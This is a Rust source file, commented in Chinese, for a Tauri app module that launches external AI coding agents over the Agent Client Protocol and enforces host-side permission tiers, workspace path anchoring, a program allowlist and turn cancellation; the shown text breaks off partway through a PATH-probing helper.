//! ACP 主机：spawn 外部 agent（stdio JSON-RPC）、会话生命周期、Tauri 命令桥。
//!
//! 传输由 agent-client-protocol 2.0.0 crate 托管（AcpAgent 进程组守卫负责回收），
//! 本模块只持有连接句柄与生命周期。安全模型（宿主强制，前端档位仅作选择入口）：
//! - 权限档位在 `acp_start` 传入，**按 handle 存放**并在宿主执行：
//!   `cautious` → 全部转发前端逐条确认；`daily` → 仅只读类工具
//!   （read / search / fetch / think）自动放行，其余转发前端；`auto` → 直通首个
//!   Allow 选项。未知档位按 `cautious` 处理（fail-closed）。
//! - 写类工具（edit / delete / move）的路径必须落在本 handle 的会话工作区内，
//!   越界一律拒绝，任何档位（含 auto）都不可绕过。
//! - agent 启动命令经白名单校验：拒绝 shell 元字符；程序名必须在已知列表内。
//! - 会话 cwd 必须是已存在的绝对路径目录，且不得为文件系统根。

use crate::process_guard;
use std::collections::HashMap;
use std::path::{Component, Path, PathBuf};
use std::str::FromStr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use agent_client_protocol::schema::v1::{
    CancelNotification, ContentBlock, InitializeRequest, McpCapabilities, NewSessionRequest,
    PermissionOption, PermissionOptionId, PermissionOptionKind, PromptRequest,
    RequestPermissionOutcome, RequestPermissionRequest, RequestPermissionResponse,
    SelectedPermissionOutcome, SessionConfigOptionValue, SessionId, SessionNotification,
    SetSessionConfigOptionRequest, TextContent, ToolCallLocation, ToolKind,
};
use agent_client_protocol::schema::ProtocolVersion;
use agent_client_protocol::{
    AcpAgent, Agent as AgentRole, Client, ConnectionTo, Error as AcpError,
};
use serde::Serialize;
use tauri::{AppHandle, Emitter, Manager, State};
use tokio::sync::oneshot;
use tokio::sync::Mutex;

/// 转发前端后的确认等待上限；超时按取消处理，避免挂死 agent 回合。
const PERMISSION_CONFIRM_TIMEOUT: Duration = Duration::from_secs(120);

/// 全量停止时留给事件循环刷出 `session/cancel` 的窗口，之后才 abort 回收进程。
const GRACEFUL_STOP_FLUSH: Duration = Duration::from_millis(150);

/// 已知 ACP agent 入口程序（basename）。通用运行时（node/npx/bun/…）允许，
/// 因为部分 agent 以 npx 包形式分发（如 zed 桥接）。
const ALLOWED_AGENT_PROGRAMS: &[&str] = &[
    "opencode",
    "codex",
    "claude",
    "gemini",
    "crush",
    "qwen",
    "droid",
    "amp",
    "amp-acp",
    "kimi",
    "glm-acp-agent",
    "goose",
    "copilot",
    "cursor-agent",
    "aider",
    "node",
    "npx",
    "bun",
    "bunx",
    "deno",
    "python3",
    "uvx",
];

/// 权限档位（与前端 settings store 的 PermTier 一一对应）。
///
/// 语义（用户确认的新三档）：
/// - ReadOnly：禁止一切写/执行类工具（Edit/Delete/Move/Execute…），只读类自动放行；
/// - Workspace：写类工具仅限当前工作区内（越界直接拦截）；只读类自动放行；
///   界内写自动放行，Execute（命令目标不可静态提取）仍逐条转发前端；
/// - Full：不设工作区锚定，任何工具自动放行（选择前前端须弹警告确认）。
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
enum PermissionTier {
    /// 未知 / 缺失值 fail-closed。
    #[default]
    ReadOnly,
    Workspace,
    Full,
}

impl PermissionTier {
    /// 旧值（cautious/daily/auto）映射：daily→Workspace、auto→Full、其余→ReadOnly。
    fn parse(raw: Option<&str>) -> Self {
        match raw.map(str::trim) {
            Some("workspace") => PermissionTier::Workspace,
            Some("full") | Some("full-access") | Some("auto") => PermissionTier::Full,
            Some("read-only") | Some("readonly") | Some("read") => PermissionTier::ReadOnly,
            // 旧存档兼容
            Some("daily") => PermissionTier::Workspace,
            _ => PermissionTier::ReadOnly,
        }
    }
}

/// daily 档可自动放行的工具类别（只读语义）。
fn is_readonly_kind(kind: Option<ToolKind>) -> bool {
    matches!(
        kind,
        Some(ToolKind::Read)
            | Some(ToolKind::Search)
            | Some(ToolKind::Fetch)
            | Some(ToolKind::Think)
    )
}

/// 写类工具：文件系统锚定只拦截会改动/删除文件的工具。
/// execute 不在此列：命令目标无法可靠静态提取，daily 档已转发前端确认。
fn is_write_kind(kind: Option<ToolKind>) -> bool {
    matches!(
        kind,
        Some(ToolKind::Edit) | Some(ToolKind::Delete) | Some(ToolKind::Move)
    )
}

/// 词法规范化路径（解析 `.` / `..`），不触碰文件系统。
/// 仅用于锚定比较，文件可能尚不存在（新建场景）。
fn normalize_lexical(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// candidate 是否位于 base 目录树内（组件级前缀匹配，杜绝 `proj` vs `proj2` 误判）。
fn is_within(base: &Path, candidate: &Path) -> bool {
    let base = normalize_lexical(base);
    let candidate = normalize_lexical(candidate);
    candidate.starts_with(&base)
}

/// 写类工具中越出 workspace 锚定的路径清单（空 = 全部合法）。
fn blocked_paths(root: &Path, locations: &[ToolCallLocation]) -> Vec<PathBuf> {
    locations
        .iter()
        .map(|location| &location.path)
        .filter(|path| !is_within(root, path))
        .cloned()
        .collect()
}

fn allow_option(options: &[PermissionOption]) -> Option<&PermissionOption> {
    options.iter().find(|option| {
        matches!(
            option.kind,
            PermissionOptionKind::AllowOnce | PermissionOptionKind::AllowAlways
        )
    })
}

fn kind_label(kind: Option<ToolKind>) -> &'static str {
    match kind {
        Some(ToolKind::Read) => "read",
        Some(ToolKind::Edit) => "edit",
        Some(ToolKind::Delete) => "delete",
        Some(ToolKind::Move) => "move",
        Some(ToolKind::Search) => "search",
        Some(ToolKind::Execute) => "execute",
        Some(ToolKind::Think) => "think",
        Some(ToolKind::Fetch) => "fetch",
        Some(ToolKind::SwitchMode) => "switch_mode",
        _ => "other",
    }
}

fn option_kind_label(kind: PermissionOptionKind) -> &'static str {
    match kind {
        PermissionOptionKind::AllowOnce => "allow_once",
        PermissionOptionKind::AllowAlways => "allow_always",
        PermissionOptionKind::RejectOnce => "reject_once",
        PermissionOptionKind::RejectAlways => "reject_always",
        _ => "other",
    }
}

/// cwd 校验：绝对路径、已存在的目录、非文件系统根（"/"、"C:\" 等）。
fn validate_cwd(raw: &str) -> Result<PathBuf, String> {
    let trimmed = raw.trim();
    let path = PathBuf::from(trimmed);
    if trimmed.is_empty() || !path.is_absolute() {
        return Err(format!("cwd must be an absolute path, got: {raw:?}"));
    }
    // 拒绝文件系统根："/"、"C:/"、"C:\"
    let normalized = trimmed.replace('\\', "/");
    if normalized == "/"
        || (normalized.len() == 3 && normalized.as_bytes()[1] == b':' && normalized.ends_with('/'))
    {
        return Err("cwd must not be a filesystem root".to_string());
    }
    if !path.is_dir() {
        return Err(format!(
            "cwd does not exist or is not a directory: {}",
            path.display()
        ));
    }
    Ok(path)
}

/// 前端对一条权限请求的裁决。
enum PermissionDecision {
    Select(PermissionOptionId),
    Cancel,
}

/// 事件信封：统一 kind + payload，前端按 kind 分流渲染。
#[derive(Serialize, Clone)]
struct AcpEventEnvelope {
    kind: &'static str,
    payload: serde_json::Value,
}

struct AcpSession {
    command: String,
    conn: ConnectionTo<AgentRole>,
    task: tauri::async_runtime::JoinHandle<()>,
    session_id: Option<SessionId>,
    /// 在途 prompt 回合：turn_id → 对应 JSON-RPC 请求 id。
    /// acp_stop(handle, turn_id) 据此发 `$/cancel_request` 精确取消单回合，
    /// 不杀 agent 进程（会话与后续回合保留）。
    turns: HashMap<u64, agent_client_protocol::schema::v1::RequestId>,
    /// 本 handle 的权限档位（acp_start 传入）。按 handle 存而非全局：编排会
    /// 并发起多个 agent，全局档位会被后启动者覆盖。
    tier: PermissionTier,
    /// 本 handle 的工作区根（文件系统锚定基准），由 acp_new_session 建立。
    /// None = 尚未建会话，无锚定基准可比。
    workspace_root: Option<PathBuf>,
    /// 本 handle 的 agent 所声明的 MCP 传输能力（initialize 回包）。
    /// 按协议只能在声明过的传输上给它 MCP 服务器，否则 session/new 会整体失败。
    mcp_capabilities: McpCapabilities,
}

/// 一条权限请求的宿主决策上下文快照：锁内取出、锁外使用，避免跨 await 持锁。
struct SessionPolicy {
    tier: PermissionTier,
    workspace_root: Option<PathBuf>,
}

impl Default for SessionPolicy {
    /// handle 未登记时的兜底：最严档位 + 无锚定基准。
    /// tier=ReadOnly 兜底（fail-closed）：即使拿不到工作区根也没有写放行路径。
    fn default() -> Self {
        Self {
            tier: PermissionTier::ReadOnly,
            workspace_root: None,
        }
    }
}

/// 待前端裁决的权限请求：应答通道 + 归属 handle。
/// 归属 handle 让 acp_stop 能精确清空该会话的待决项，否则会话结束后
/// 这些 sender 会一直悬挂到 PERMISSION_CONFIRM_TIMEOUT。
struct PendingPermission {
    handle: u64,
    responder: oneshot::Sender<PermissionDecision>,
}

/// 全局主机状态（tauri manage）。档位与工作区根都随 session 存放，
/// 见 `AcpSession::tier` / `AcpSession::workspace_root`。
#[derive(Default)]
pub struct AcpHost {
    next_id: AtomicU64,
    next_permission_id: AtomicU64,
    next_turn_id: AtomicU64,
    sessions: Mutex<HashMap<u64, AcpSession>>,
    pending_permissions: Mutex<HashMap<u64, PendingPermission>>,
}

fn emit(app: &AppHandle, kind: &'static str, payload: serde_json::Value) {
    let _ = app.emit("acp://event", AcpEventEnvelope { kind, payload });
}

impl AcpHost {
    /// 活跃 ACP 进程数（系统诊断面）。
    pub async fn session_count(&self) -> usize {
        self.sessions.lock().await.len()
    }

    /// 取出某 handle 的决策上下文快照；handle 未登记时返回最严兜底。
    async fn policy_for(&self, handle: u64) -> SessionPolicy {
        self.sessions
            .lock()
            .await
            .get(&handle)
            .map(|session| SessionPolicy {
                tier: session.tier,
                workspace_root: session.workspace_root.clone(),
            })
            .unwrap_or_default()
    }

    /// 就地改写某 handle 的权限档位（临时降级/回升）。
    ///
    /// `resolve_permission` 每条请求都重新 `policy_for(handle)`，因此改档对**在途会话
    /// 立即生效**，无需重启 agent 进程 —— 这正是「Full 会话内一键降 ReadOnly 跑完再升」
    /// 能保住上下文的原因。未登记的 handle 返回错误而不静默成功，避免前端以为降级了。
    async fn set_tier(&self, handle: u64, tier: PermissionTier) -> Result<(), String> {
        self.sessions
            .lock()
            .await
            .get_mut(&handle)
            .map(|session| session.tier = tier)
            .ok_or_else(|| format!("unknown handle {handle}"))
    }
}

/// 按 ACP SessionUpdate 变体分类转发为语义事件；未识别的变体保持
/// 原始 `session-update` 载荷（前端既有解析依赖该事件名与形状）。
fn classify_notification(app: &AppHandle, notification: SessionNotification) {
    use agent_client_protocol::schema::v1::{ContentBlock, SessionUpdate};
    let session_id = notification.session_id.to_string();
    match notification.update {
        SessionUpdate::AgentThoughtChunk(chunk) => {
            if let ContentBlock::Text(text) = chunk.content {
                emit(
                    app,
                    "thought",
                    serde_json::json!({
                        "sessionId": session_id,
                        "text": text.text,
                        "messageId": chunk.message_id,
                    }),
                );
            }
        }
        SessionUpdate::UsageUpdate(usage) => {
            emit(
                app,
                "usage",
                serde_json::json!({
                    "sessionId": session_id,
                    "used": usage.used,
                    "size": usage.size,
                    "cost": usage.cost,
                    "meta": usage.meta,
                }),
            );
        }
        SessionUpdate::AvailableCommandsUpdate(update) => {
            emit(
                app,
                "commands",
                serde_json::json!({
                    "sessionId": session_id,
                    "availableCommands": update.available_commands,
                }),
            );
        }
        SessionUpdate::ConfigOptionUpdate(update) => {
            emit(
                app,
                "config-options",
                serde_json::json!({
                    "sessionId": session_id,
                    "configOptions": update.config_options,
                }),
            );
        }
        _ => {
            let payload = serde_json::to_value(&notification).unwrap_or(serde_json::Value::Null);
            emit(app, "session-update", payload);
        }
    }
}

/// 组装给前端的权限请求载荷；auto=true 表示宿主已代为决策（仅通知流）。
fn permission_payload(
    request_id: u64,
    auto: bool,
    chosen: Option<&str>,
    request: &RequestPermissionRequest,
) -> serde_json::Value {
    serde_json::json!({
        "requestId": request_id,
        "auto": auto,
        "chosen": chosen,
        "toolCallId": request.tool_call.tool_call_id.to_string(),
        "title": request.tool_call.fields.title,
        "kind": kind_label(request.tool_call.fields.kind),
        "options": request.options.iter().map(|option| serde_json::json!({
            "optionId": option.option_id.to_string(),
            "name": option.name,
            "kind": option_kind_label(option.kind),
        })).collect::<Vec<_>>(),
    })
}

/// 启动外部 ACP agent 子进程并完成 initialize 握手，返回主机句柄 id。
///
/// `tier` 取前端权限档位（"cautious" | "daily" | "auto"），缺省/未知按 cautious。
/// `sandbox` 取沙盒档位（"off" | "fs" | "full"），非 off 时以 bwrap 包裹进程；
/// `workspace` 为沙盒可写锚定目录（即会话工作区），仅在沙盒开启时必需。
#[tauri::command]
pub async fn acp_start(
    app: AppHandle,
    state: State<'_, AcpHost>,
    agent_cmd: String,
    tier: Option<String>,
    sandbox: Option<String>,
    workspace: Option<String>,
) -> Result<u64, String> {
    let command = process_guard::validate_spawn_command(&agent_cmd, ALLOWED_AGENT_PROGRAMS)?;
    let tier = PermissionTier::parse(tier.as_deref());

    let mode = crate::sandbox::SandboxMode::parse(sandbox.as_deref());
    let command = if mode == crate::sandbox::SandboxMode::Off {
        command
    } else {
        if !crate::sandbox::sandbox_available() {
            return Err("sandbox: bwrap is not installed on this system".to_string());
        }
        let cwd = workspace
            .as_deref()
            .map(validate_cwd)
            .transpose()?
            .ok_or_else(|| "sandbox: workspace is required when sandbox is enabled".to_string())?;
        let home = std::env::var("HOME").ok().map(std::path::PathBuf::from);
        crate::sandbox::wrap_command(mode, &cwd, home.as_deref(), &command)?
    };

    let handle_id = state.next_id.fetch_add(1, Ordering::SeqCst);
    let agent =
        AcpAgent::from_str(&command).map_err(|error| format!("invalid agent command: {error}"))?;

    let (ready_tx, mut ready_rx) = tokio::sync::mpsc::channel::<ConnectionTo<AgentRole>>(1);
    let app_task = app.clone();

    let task = tauri::async_runtime::spawn(async move {
        let _ = Client
            .builder()
            .on_receive_notification(
                {
                    let app = app_task.clone();
                    async move |notification: SessionNotification,
                                _conn: ConnectionTo<AgentRole>| {
                        classify_notification(&app, notification);
                        Ok::<(), AcpError>(())
                    }
                },
                agent_client_protocol::on_receive_notification!(),
            )
            .on_receive_request(
                {
                    let app = app_task.clone();
                    async move |request: RequestPermissionRequest,
                                responder,
                                _conn: ConnectionTo<AgentRole>| {
                        let response = resolve_permission(&app, handle_id, request).await;
                        responder.respond(response)
                    }
                },
                agent_client_protocol::on_receive_request!(),
            )
            .connect_with(agent, |conn: ConnectionTo<AgentRole>| async move {
                let _ = ready_tx.send(conn).await;
                // 保持连接事件循环存活直至 acp_stop abort；闭包契约要求返回 Result
                let never: Result<(), AcpError> = std::future::pending().await;
                never
            })
            .await;
    });

    let conn = tokio::time::timeout(Duration::from_secs(10), ready_rx.recv())
        .await
        .map_err(|_| "agent handshake timeout (10s)".to_string())?
        .ok_or_else(|| "agent connection closed before ready".to_string())?;

    // initialize 回包里带 agent 的 MCP 传输能力：留着给 acp_new_session 做声明过滤，
    // 免得把 http 服务器塞给只支持 stdio 的 agent 而让整个 session/new 失败。
    let initialize = conn
        .clone()
        .send_request(InitializeRequest::new(ProtocolVersion::V1))
        .block_task()
        .await
        .map_err(|error| format!("initialize failed: {error}"))?;
    let mcp_capabilities = initialize.agent_capabilities.mcp_capabilities.clone();

    state.sessions.lock().await.insert(
        handle_id,
        AcpSession {
            command,
            conn,
            task,
            session_id: None,
            turns: HashMap::new(),
            tier,
            workspace_root: None,
            mcp_capabilities,
        },
    );
    emit(&app, "started", serde_json::json!({ "handle": handle_id }));
    Ok(handle_id)
}

/// 宿主对一条权限请求的裁决（纯函数产物，不含 I/O），由 `decide_permission` 得出。
#[derive(Debug, PartialEq, Eq)]
enum PermissionVerdict {
    /// 只读档：写/执行类工具一律拒绝（不依赖锚定）。
    BlockedReadOnly,
    /// Workspace 档：写类工具路径越出工作区：直接拒绝，附越界路径清单。
    BlockedOutsideWorkspace(Vec<PathBuf>),
    /// 按档位自动放行，附选中的 Allow 选项。
    AutoAllow(PermissionOptionId),
    /// Full 档但请求未提供任何 Allow 选项：直接取消，不打扰用户。
    AutoCancel,
    /// 转发前端逐条确认。
    Ask,
}

/// 档位 + 工作区锚定的完整决策逻辑。抽成纯函数以便直接单测宿主策略，
/// 而不必拉起 Tauri app / agent 进程。
///
/// 判定顺序：档位边界（只读/锚定）> 档位自动放行 > 转发前端。
/// Full 档跳过锚定（选择前已由前端警告确认）；Workspace 档的锚定不可绕过。
fn decide_permission(
    policy: &SessionPolicy,
    request: &RequestPermissionRequest,
) -> PermissionVerdict {
    let kind = request.tool_call.fields.kind;
    let readonly = is_readonly_kind(kind);
    let write = is_write_kind(kind);

    match policy.tier {
        PermissionTier::ReadOnly => {
            // 非只读类（写 / 执行 / 未知）一律拒绝；只读类放行（无 Allow 选项则问前端）
            if !readonly {
                return PermissionVerdict::BlockedReadOnly;
            }
            if let Some(option) = allow_option(&request.options) {
                return PermissionVerdict::AutoAllow(option.option_id.clone());
            }
            PermissionVerdict::Ask
        }
        PermissionTier::Workspace => {
            if write {
                match policy.workspace_root.as_deref() {
                    // 无锚定基准（未绑工作区/未建会话）→ 写类逐条确认，不盲放
                    None => return PermissionVerdict::Ask,
                    Some(root) => {
                        let locations = request
                            .tool_call
                            .fields
                            .locations
                            .as_deref()
                            .unwrap_or_default();
                        let outside = blocked_paths(root, locations);
                        if !outside.is_empty() {
                            return PermissionVerdict::BlockedOutsideWorkspace(outside);
                        }
                        // 界内写：自动放行（工作区语义 = 区内自由读写）
                        if let Some(option) = allow_option(&request.options) {
                            return PermissionVerdict::AutoAllow(option.option_id.clone());
                        }
                        return PermissionVerdict::Ask;
                    }
                }
            }
            // 只读类自动放行；Execute 等无法验证目标的工具逐条确认
            if readonly {
                if let Some(option) = allow_option(&request.options) {
                    return PermissionVerdict::AutoAllow(option.option_id.clone());
                }
            }
            PermissionVerdict::Ask
        }
        PermissionTier::Full => {
            if let Some(option) = allow_option(&request.options) {
                PermissionVerdict::AutoAllow(option.option_id.clone())
            } else {
                PermissionVerdict::AutoCancel
            }
        }
    }
}

/// 宿主侧权限档位执行：`decide_permission` 定策略，本函数只负责事件发射、
/// 待决登记与等待裁决。
///
/// `handle` 为发起该请求的 agent 句柄——档位与工作区锚定都按 handle 取，
/// 因此并发的多个 agent 各自适用自己启动时的档位与工作区。
async fn resolve_permission(
    app: &AppHandle,
    handle: u64,
    request: RequestPermissionRequest,
) -> RequestPermissionResponse {
    let policy = app.state::<AcpHost>().policy_for(handle).await;

    match decide_permission(&policy, &request) {
        PermissionVerdict::BlockedReadOnly => {
            emit(
                app,
                "permission-blocked",
                serde_json::json!({
                    "auto": true,
                    "chosen": null,
                    "toolCallId": request.tool_call.tool_call_id.to_string(),
                    "title": request.tool_call.fields.title,
                    "kind": kind_label(request.tool_call.fields.kind),
                    "reason": "read-only",
                    "paths": [],
                }),
            );
            return RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled);
        }
        PermissionVerdict::BlockedOutsideWorkspace(outside) => {
            emit(
                app,
                "permission-blocked",
                serde_json::json!({
                    "auto": true,
                    "chosen": null,
                    "toolCallId": request.tool_call.tool_call_id.to_string(),
                    "title": request.tool_call.fields.title,
                    "kind": kind_label(request.tool_call.fields.kind),
                    "reason": "outside-workspace",
                    "paths": outside.iter().map(|path| path.to_string_lossy()).collect::<Vec<_>>(),
                }),
            );
            return RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled);
        }
        PermissionVerdict::AutoAllow(option_id) => {
            emit(
                app,
                "permission-auto",
                permission_payload(
                    u64::MAX,
                    true,
                    Some(option_id.to_string().as_str()),
                    &request,
                ),
            );
            return RequestPermissionResponse::new(RequestPermissionOutcome::Selected(
                SelectedPermissionOutcome::new(option_id),
            ));
        }
        PermissionVerdict::AutoCancel => {
            return RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled);
        }
        PermissionVerdict::Ask => {}
    }

    // 转发前端：登记 pending 后立即释放锁，再等待裁决（或超时=取消）。
    let rx = {
        let host = app.state::<AcpHost>();
        let request_id = host.next_permission_id.fetch_add(1, Ordering::SeqCst);
        let (tx, rx) = oneshot::channel::<PermissionDecision>();
        host.pending_permissions.lock().await.insert(
            request_id,
            PendingPermission {
                handle,
                responder: tx,
            },
        );
        emit(
            app,
            "permission-request",
            permission_payload(request_id, false, None, &request),
        );
        rx
    };

    match tokio::time::timeout(PERMISSION_CONFIRM_TIMEOUT, rx).await {
        Ok(Ok(PermissionDecision::Select(option_id))) => RequestPermissionResponse::new(
            RequestPermissionOutcome::Selected(SelectedPermissionOutcome::new(option_id)),
        ),
        _ => RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled),
    }
}

/// 前端裁决回传：requestId 对应待决请求；optionId 为空表示拒绝。
#[tauri::command]
pub async fn acp_permission_respond(
    state: State<'_, AcpHost>,
    request_id: u64,
    option_id: Option<String>,
) -> Result<(), String> {
    let sender = state
        .pending_permissions
        .lock()
        .await
        .remove(&request_id)
        .ok_or_else(|| format!("unknown permission request {request_id}"))?;
    let decision = match option_id {
        Some(id) => PermissionDecision::Select(PermissionOptionId::from(id)),
        None => PermissionDecision::Cancel,
    };
    let _ = sender.responder.send(decision);
    Ok(())
}

/// 在已启动的 agent 上创建 ACP 会话（session/new）。cwd 由宿主校验。
///
/// `mcp_servers` 是用户在设置页声明的 MCP 服务器：按 agent 的 `mcpCapabilities`
/// 过滤后随 `session/new` 一起交给 agent，由 **agent** 去连接并把工具并入它的
/// 工具面。宿主不代理工具调用。
///
/// 返回 `{ sessionId, configOptions, mcpServers, skippedMcpServers }`：
/// configOptions 为 agent 暴露的会话级选择器（模型 / 推理力度 / 模式等），
/// 不支持时为空数组；mcpServers 是真正声明出去的名字，skippedMcpServers 带原因，
/// 让前端能明确告诉用户「这台被跳过了，因为该后端不支持 http」。
#[tauri::command]
pub async fn acp_new_session(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
    cwd: String,
    mcp_servers: Option<Vec<crate::mcp::McpServerConfig>>,
) -> Result<serde_json::Value, String> {
    let cwd = validate_cwd(&cwd)?;
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;
    // 更新本 handle 的文件系统锚定基准：本会话的工作区根。
    session.workspace_root = Some(cwd.clone());

    let (servers, skipped) =
        crate::mcp::plan_servers(&mcp_servers.unwrap_or_default(), &session.mcp_capabilities);
    let declared: Vec<String> = servers.iter().map(crate::mcp::server_name).collect();

    let response = session
        .conn
        .clone()
        .send_request(NewSessionRequest::new(cwd).mcp_servers(servers))
        .block_task()
        .await
        .map_err(|error| format!("session/new failed: {error}"))?;
    let session_id = response.session_id.clone();
    let id_str = session_id.to_string();
    let config_options = serde_json::to_value(response.config_options.clone().unwrap_or_default())
        .unwrap_or_else(|_| serde_json::Value::Array(Vec::new()));
    session.session_id = Some(session_id);
    emit(
        &app,
        "session-new",
        serde_json::json!({
            "handle": handle,
            "sessionId": id_str,
            "mcpServers": declared,
            "skippedMcpServers": skipped,
        }),
    );
    Ok(serde_json::json!({
        "sessionId": id_str,
        "configOptions": config_options,
        "mcpServers": declared,
        "skippedMcpServers": skipped,
    }))
}

/// 设置会话配置选项（session/set_config_option）：模型 / 推理力度 / 会话模式等。
/// select 选项传字符串值，boolean 选项传布尔值；返回全量最新配置选项。
#[tauri::command]
pub async fn acp_set_config(
    state: State<'_, AcpHost>,
    handle: u64,
    config_id: String,
    value: serde_json::Value,
) -> Result<serde_json::Value, String> {
    let option_value = match value {
        serde_json::Value::String(raw) => SessionConfigOptionValue::value_id(raw),
        serde_json::Value::Bool(flag) => SessionConfigOptionValue::boolean(flag),
        other => {
            return Err(format!(
                "unsupported config value {other}; expected string or bool"
            ))
        }
    };
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;
    let session_id = session
        .session_id
        .clone()
        .ok_or_else(|| "session not created; call acp_new_session first".to_string())?;

    let response = session
        .conn
        .clone()
        .send_request(SetSessionConfigOptionRequest::new(
            session_id,
            config_id,
            option_value,
        ))
        .block_task()
        .await
        .map_err(|error| format!("session/set_config_option failed: {error}"))?;

    Ok(serde_json::to_value(&response).unwrap_or(serde_json::Value::Null))
}

/// 改写在途会话的权限档位（前端「临时只读」开关；未知档位串 fail-closed 到 ReadOnly）。
#[tauri::command]
pub async fn acp_set_permission_tier(
    state: State<'_, AcpHost>,
    handle: u64,
    tier: String,
) -> Result<(), String> {
    state.set_tier(handle, PermissionTier::parse(Some(&tier))).await
}

/// 发送一轮 prompt；立即返回 `{ turnId }`，回合结果经 `prompt-done` 事件
/// （携带 handle/turnId/response）异步送达——对齐 GreyWork sendMessage 立即
/// ack + message.stream 回流的模型。流式增量经 acp://event 通知。
///
/// 回合登记进 session.turns（turn_id → JSON-RPC request id），acp_stop 可
/// 按 turn_id 发 `$/cancel_request` 精确取消；完成/取消后自动摘除登记。
/// 注意：sessions 锁只在短临界区持有（克隆连接、登记回合）；回合等待在
/// 独立 task 中进行，acp_stop 随时可取得锁发起取消。
#[tauri::command]
pub async fn acp_send(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
    text: String,
) -> Result<serde_json::Value, String> {
    // 短临界区：登记回合后立即释放锁。sent 必须随块返回——SentRequest 的
    // Drop 会向对端发取消请求，块内丢弃等于立即取消本回合。
    let (sent, turn_id) = {
        let mut sessions = state.sessions.lock().await;
        let session = sessions
            .get_mut(&handle)
            .ok_or_else(|| format!("unknown handle {handle}"))?;
        let session_id = session
            .session_id
            .clone()
            .ok_or_else(|| "session not created; call acp_new_session first".to_string())?;
        let sent = session.conn.clone().send_request(PromptRequest::new(
            session_id.clone(),
            vec![ContentBlock::Text(TextContent::new(text))],
        ));
        let turn_id = state.next_turn_id.fetch_add(1, Ordering::SeqCst);
        session.turns.insert(turn_id, sent.id().clone());
        (sent, turn_id)
    };

    // 锁外等待回合结果（独立 task）：取消或完成都会唤醒 block_task，
    // 完成后发 prompt-done 并摘除登记。
    let app_task = app.clone();
    tauri::async_runtime::spawn(async move {
        let response = sent.block_task().await;
        app_task
            .state::<AcpHost>()
            .sessions
            .lock()
            .await
            .get_mut(&handle)
            .map(|session| session.turns.remove(&turn_id));
        match response {
            Ok(result) => {
                let payload = serde_json::to_value(&result).unwrap_or(serde_json::Value::Null);
                emit(
                    &app_task,
                    "prompt-done",
                    serde_json::json!({ "handle": handle, "turnId": turn_id, "response": payload }),
                );
            }
            Err(error) => {
                emit(
                    &app_task,
                    "prompt-done",
                    serde_json::json!({
                        "handle": handle,
                        "turnId": turn_id,
                        "error": error.to_string(),
                    }),
                );
            }
        }
    });

    Ok(serde_json::json!({ "turnId": turn_id }))
}

/// 停止会话或取消单回合：
/// - `turn_id` 为 Some：发 `$/cancel_request` 取消该回合，agent 进程与会话保留。
///   对应前端「停止生成」语义——后续仍可继续 prompt。
/// - `turn_id` 为 None：发 `session/cancel` 让 agent 收尾，短暂等待刷出后
///   abort 事件循环任务并回收子进程。
///
/// 两种路径都会释放该 handle 的待决权限请求：被取消的工具调用不会再有人应答，
/// 留着只会挂到 PERMISSION_CONFIRM_TIMEOUT。前端按 handle 串行发起回合
/// （acpBusy 互斥），故按 handle 清理不会误伤并发回合。
#[tauri::command]
pub async fn acp_stop(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
    turn_id: Option<u64>,
) -> Result<(), String> {
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;

    if let Some(turn_id) = turn_id {
        let request_id = session
            .turns
            .remove(&turn_id)
            .ok_or_else(|| format!("unknown or finished turn {turn_id}"))?;
        session
            .conn
            .send_cancel_request(request_id)
            .map_err(|error| format!("cancel turn {turn_id} failed: {error}"))?;
        drop(sessions);
        release_pending_permissions(&state, handle).await;
        emit(
            &app,
            "turn-cancelled",
            serde_json::json!({ "handle": handle, "turnId": turn_id }),
        );
        return Ok(());
    }

    let session = sessions.remove(&handle).expect("checked above");
    drop(sessions);
    release_pending_permissions(&state, handle).await;

    // 先通知 agent 会话作废（best-effort：连接已断则无所谓），再让事件循环
    // 有一小段时间把通知刷进 stdin，最后 abort 回收进程组。abort 在独立任务里
    // 做，命令本身立即返回；此时 session 已从表中摘除，不会再有新请求路由过来。
    if let Some(session_id) = session.session_id.clone() {
        let _ = session
            .conn
            .send_notification(CancelNotification::new(session_id));
    }
    tauri::async_runtime::spawn(async move {
        tokio::time::sleep(GRACEFUL_STOP_FLUSH).await;
        session.task.abort();
        drop(session);
    });
    emit(&app, "stopped", serde_json::json!({ "handle": handle }));
    Ok(())
}

/// 释放某 handle 名下所有待决权限请求（按取消应答），避免 sender 悬挂至超时。
async fn release_pending_permissions(state: &AcpHost, handle: u64) {
    let mut pending = state.pending_permissions.lock().await;
    let stale: Vec<u64> = pending
        .iter()
        .filter(|(_, entry)| entry.handle == handle)
        .map(|(id, _)| *id)
        .collect();
    for id in stale {
        if let Some(entry) = pending.remove(&id) {
            let _ = entry.responder.send(PermissionDecision::Cancel);
        }
    }
}

/// 当前存活句柄清单（诊断用）。
#[tauri::command]
pub async fn acp_list(state: State<'_, AcpHost>) -> Result<Vec<serde_json::Value>, String> {
    let sessions = state.sessions.lock().await;
    Ok(sessions
        .iter()
        .map(|(id, session)| {
            serde_json::json!({
                "handle": id,
                "command": session.command,
                "hasSession": session.session_id.is_some(),
            })
        })
        .collect())
}

/// PATH 探测结果（设置页据此显示「已安装 / 未安装」）。
#[derive(Serialize)]
pub struct AgentProgramProbe {
    program: String,
    installed: bool,
    path: Option<String>,
}

/// 在给定 PATH 值里找可执行文件；纯文件系统命中，不起进程。
fn probe_program(
    program: &str,
    path_value: Option<&std::ffi::OsStr>,
) -> Option<std::path::PathBuf> {
    let value = path_value
        .map(|v| v.to_os_string())
